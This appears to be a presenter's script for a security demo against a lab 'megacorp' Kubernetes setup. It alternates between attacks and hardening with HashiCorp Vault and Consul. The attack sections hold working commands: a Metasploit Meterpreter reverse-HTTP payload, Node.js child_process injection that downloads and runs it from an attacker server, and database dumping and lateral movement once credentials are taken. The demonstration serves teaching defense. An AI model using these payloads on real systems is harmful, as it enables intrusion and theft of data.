# Execute Hack

## Run script to check for vulnerability

```shell
scan
```

## Create payload
```shell
msfvenom \
  -p linux/x86/meterpreter_reverse_http \
  LHOST=$(dig +short kali.container.shipyard.run) \
  LPORT=9999 \
  -f elf > payload

```

```shell
chmod +x payload
```

```shell
./payload
```

```shell
python3 -m http.server &> /dev/null &
```

```shell
msfconsole
```

## Start reverse handler
```shell
db_status
```

```shell
use exploit/multi/handler
```

```shell
set PAYLOAD linux/x86/meterpreter_reverse_http
```

```shell
set LHOST 0.0.0.0
```

```shell
set LPORT 9999
```

```shell
run
```

## Execute hack

```shell
COMMAND="curl 10.5.0.2:8000/payload -o payload"

curl http://search.megacorp.com \
    -G \
    --data-urlencode "device[]=x" \
    --data-urlencode "device[]=y'-require('child_process').exec('${COMMAND}')-'"

```

```shell
COMMAND="chmod +x payload"
curl http://search.megacorp.com \
    -G \
    --data-urlencode "device[]=x" \
    --data-urlencode "device[]=y'-require('child_process').exec('${COMMAND}')-'"

```

```shell
COMMAND="./payload"
curl http://search.megacorp.com \
    -G \
    --data-urlencode "device[]=x" \
    --data-urlencode "device[]=y'-require('child_process').exec('${COMMAND}')-'"

```

```shell
pwd
```

```shell
getuid
```

```shell
ps
```

```shell
run post/linux/gather/enum_system
```

```shell
shell
```

## Abuse host
```shell
env
```

```shell
apt update && apt install -y postgresql-client
```

```shell
PGPASSWORD=$DATABASE_PASSWORD psql -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w -d $DATABASE_NAME
```

```shell
\l
```

```shell
\du+
```

```shell
\d
```

```shell
SELECT * FROM users;
```

```shell
PGPASSWORD=$DATABASE_PASSWORD pg_dump -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w root
```

# Securing the Database

## Install Vault

```shell
helm repo add hashicorp https://helm.releases.hashicorp.com

helm install \
    -f ./vault-values.yaml \
    vault \
    hashicorp/vault
```

## Configure Vault

```shell
POD_NAME=$(kubectl get pods --selector "app.kubernetes.io/instance=vault,component=server" -o jsonpath="{.items[0].metadata.name}")

kubectl exec ${POD_NAME} -it -c vault -- sh
```

```shell
vault auth enable kubernetes
```

```shell
vault write auth/kubernetes/config \
   token_reviewer_jwt="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   kubernetes_host=https://${KUBERNETES_SERVICE_HOST}:443 \
   kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

```shell
vault secrets enable database
```

```shell
vault write database/config/root \
  plugin_name=postgresql-database-plugin \
  allowed_roles="*" \
  connection_url="postgresql://{{username}}:{{password}}@database:5432/root?sslmode=disable" \
  username="root" \
  password="please_change_me_barry"
```

```shell
vault write --force /database/rotate-root/root
```

```shell
cat <<EOF | vault policy write payments -
path "database/creds/db-payments" {
  capabilities = ["read"]
}
EOF
```

```shell
cat <<EOF | vault policy write search -
path "database/creds/db-search" {
  capabilities = ["read"]
}
EOF
```

```shell
vault write auth/kubernetes/role/search \
  bound_service_account_names=search \
  bound_service_account_namespaces=default \
  policies=search \
  ttl=1h
```

```shell
vault write auth/kubernetes/role/payments \
  bound_service_account_names=payments \
  bound_service_account_namespaces=default \
  policies=payments\
  ttl=1h
```

```shell
vault write database/roles/db-search \
  db_name=root \
  creation_statements="CREATE ROLE \"{{name}}\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; \
      GRANT SELECT ON branches TO \"{{name}}\";" \
  revocation_statements="ALTER ROLE \"{{name}}\" NOLOGIN;"\
  default_ttl="1h" \
  max_ttl="24h"
```

```shell
vault write database/roles/db-payments \
  db_name=root \
  creation_statements="CREATE ROLE \"{{name}}\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; \
      GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";" \
  revocation_statements="ALTER ROLE \"{{name}}\" NOLOGIN;"\
  default_ttl="1h" \
  max_ttl="24h"
```

## Modify Pod to use Vaultear

```yaml
      annotations:
        vault.hashicorp.com/agent-inject: "true"
        vault.hashicorp.com/role: "search"
        vault.hashicorp.com/agent-inject-secret-config: "database/creds/db-search"
        vault.hashicorp.com/agent-inject-template-config: |
          {{ with secret "database/creds/db-search" -}}
          export POSTGRES_USER="{{ .Data.username }}"
          export POSTGRES_PASS="{{ .Data.password }}"
          export POSTGRES_DB="root"
          {{- end }}
          env
          npm start
```

```yaml
command: ['sh', '/vault/secrets/config']
```

## Check the new secrets can be seen in the pod

```shell
cat /proc/19/environ | tr '\0' '\n' | grep -a DATABASE
```

# Hack 2

## Run metasploit again and execute the DB grep

```shell
COMMAND="curl 10.5.0.2:8000/payload -o payload; chmod +x payload; ./payload"

curl http://search.megacorp.com \
    -G \
    --data-urlencode "device[]=x" \
    --data-urlencode "device[]=y'-require('child_process').exec('${COMMAND}')-'"
```

```shell
apt update && apt install -y postgresql-client
```

```shell
PGPASSWORD=$DATABASE_PASSWORD psql -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w -d $DATABASE_NAME
```

## Copy scan to the new server

```shell
curl 10.5.0.2:8000/scan -o scan
```

## Start the payload on the payments service
```
COMMAND="curl 10.5.0.2:8000/payload -o payload; chmod +x payload; ./payload"

curl http://10.43.252.166:9090 \
    -G \
    --data-urlencode "device[]=x" \
    --data-urlencode "device[]=y'-require('child_process').exec('${COMMAND}')-'"
```


```shell
apt update && apt install -y postgresql-client
```

## Get the data

```shell
PGPASSWORD=$DATABASE_PASSWORD psql -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w -d $DATABASE_NAME
```

```shell
\d
```

# Secure Consul

## Installing Consul

```shell
helm install \
  -f consul-values.yaml \
  consul \
  hashicorp/consul

```

## Modify pods

* Remove services as not needed
* Add the configuration

```yaml
        consul.hashicorp.com/connect-inject: "true"
        consul.hashicorp.com/connect-service-port: "3000"
        consul.hashicorp.com/connect-service-upstreams: "database:5432"
```

* Install the App
* Show injected elements to pod
* Login to test the app show not working to DB

```shell
PGPASSWORD=$DATABASE_PASSWORD psql \
  -h $DATABASE_SERVICE_HOST \
  -p $DATABASE_SERVICE_PORT \
  -U $DATABASE_USER \
  -w \
  -d $DATABASE_NAME

```

* Add intentions
* Show working

# Hack 3 abusing ACL system